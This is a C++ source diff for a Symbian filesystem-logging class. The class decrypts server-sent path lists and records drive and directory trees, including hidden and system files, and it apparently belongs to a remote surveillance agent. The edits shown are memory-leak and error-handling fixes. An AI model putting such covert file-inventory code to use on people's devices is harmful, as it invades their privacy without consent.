@@ -130,6 +130,8 @@ void CStateFileSystem::ProcessDataL(const TDesC8& aData)
 	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
 		{
 		//server answered with a redirect
+		delete iResponseData;
+		iResponseData = NULL;
 		iObserver.ResponseError(KErrContent);
 		return;
 		}
@@ -137,7 +139,10 @@ void CStateFileSystem::ProcessDataL(const TDesC8& aData)
 	//extract body from response
 	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
 	body.CleanupClosePushL();
-		
+	
+	delete iResponseData;
+	iResponseData = NULL;
+	
 	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
 	CleanupStack::PopAndDestroy(&body);
 	plainBody.CleanupClosePushL();
@@ -191,23 +196,25 @@ void CStateFileSystem::LogFilesystemL(const TDesC8& aPathList)
 		ptr += sizeof(TUint32);
 		//retrieve path
 		HBufC* path = HBufC::NewL(len);
-		if (len > 0)
+		CleanupStack::PushL(path);
+		if (len > 2)
 			{
 			TUint8 totChars = (len-2) / 2;
 			TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
-			path->Des().Append(ptrNum);  
+			path->Des().Append(ptrNum);
+			//log tree
+			LogTreeL(iFs,*path,level);
 			}
+		CleanupStack::PopAndDestroy(path);
 		ptr += len;
-		//log tree
-		LogTreeL(iFs,*path,level);
 		}
 	}
 
-
-//TODO: verify all this! check error conditions!
+/**
+ * Every filesystem inspection is started asking the drive list.
+ */
 void CStateFileSystem::LogDrives(RFs& aFs)
 	{
-	//this is the special case: we are asked the drive list
 	//any byte in the drive list which has a non zero value signifies 
 	//that the corresponding drive exists. The byte's value can be used to retrieve 
 	//the drive's attributes by using a bitwise AND with the corresponding drive attribute constant.
@@ -220,20 +227,20 @@ void CStateFileSystem::LogDrives(RFs& aFs)
 	//log drives
 	for(TInt driveNumber=EDriveA; driveNumber<=EDriveZ; driveNumber++)
 		{
-		if (driveList[driveNumber]) /** now we iterate through all the available drives */
+		if (driveList[driveNumber]) //we iterate through all the available drives 
 			{
 			TChar driveLetter;
 			err = aFs.DriveToChar(driveNumber,driveLetter);
 			TBuf<8> buf;
 			buf.Format(KFormat,(TUint)driveLetter);
 			buf.Append(KNull);  //NULL terminated
-			HBufC8* rootBuf = GetDriveBuffer(buf);
+			HBufC8* rootBuf = GetDriveBufferL(buf);
+			CleanupStack::PushL(rootBuf);
 			if(rootBuf->Size()>0)
 				{
-				CleanupStack::PushL(rootBuf);
 				iLogFs->AppendLogL(*rootBuf);
-				CleanupStack::PopAndDestroy(rootBuf);
 				}
+			CleanupStack::PopAndDestroy(rootBuf);
 			}
 		}
 	}
@@ -269,8 +276,12 @@ void CStateFileSystem::LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel)
 		for(TInt i=0; i<pathCount; i++)
 			{
 			TInt result = aFs.GetDir(*(pathList[i]),KEntryAttNormal | KEntryAttHidden | KEntryAttSystem,ESortByName | EDirsFirst | EAscending,fileList,dirList);
-			if(result == KErrPermissionDenied)
+			if(result != KErrNone)
 				{
+				//errors could be for example:
+				//KErrPermissionDenied (-46): we don't have AllFiles or TCB capab granted
+				//KErrNotReady (-18): we are trying to access a not formatted flash card 
+				// ...
 				continue;
 				}
 			CleanupStack::PushL(dirList);
@@ -281,7 +292,7 @@ void CStateFileSystem::LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel)
 			//log found files
 			for(TInt j=0;j<fileCount;j++)
 				{
-				RBuf8 buf(GetPathBuffer((*fileList)[j],*(pathList[i])));
+				RBuf8 buf(GetPathBufferL((*fileList)[j],*(pathList[i])));
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 					{
@@ -289,11 +300,11 @@ void CStateFileSystem::LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel)
 					}
 				CleanupStack::PopAndDestroy(&buf);
 				}
-			//log & append dir
+			//dir log & append (for next round)
 			for(TInt k=0;k<dirCount;k++)
 				{
 				//log
-				RBuf8 buf(GetPathBuffer((*dirList)[k],*(pathList[i])));
+				RBuf8 buf(GetPathBufferL((*dirList)[k],*(pathList[i])));
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 					{
@@ -327,7 +338,7 @@ void CStateFileSystem::LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel)
 	}
 
 
-HBufC8* CStateFileSystem::GetPathBuffer(TEntry aEntry, const TDesC& aParentPath)
+HBufC8* CStateFileSystem::GetPathBufferL(TEntry aEntry, const TDesC& aParentPath)
 	{
 	TFilesystemData fsData;
 	
@@ -358,7 +369,7 @@ HBufC8* CStateFileSystem::GetPathBuffer(TEntry aEntry, const TDesC& aParentPath)
 	}
 
 
-HBufC8* CStateFileSystem::GetDriveBuffer(const TDesC& aDrivePath)
+HBufC8* CStateFileSystem::GetDriveBufferL(const TDesC& aDrivePath)
 	{
 	TFilesystemData fsData;
 		
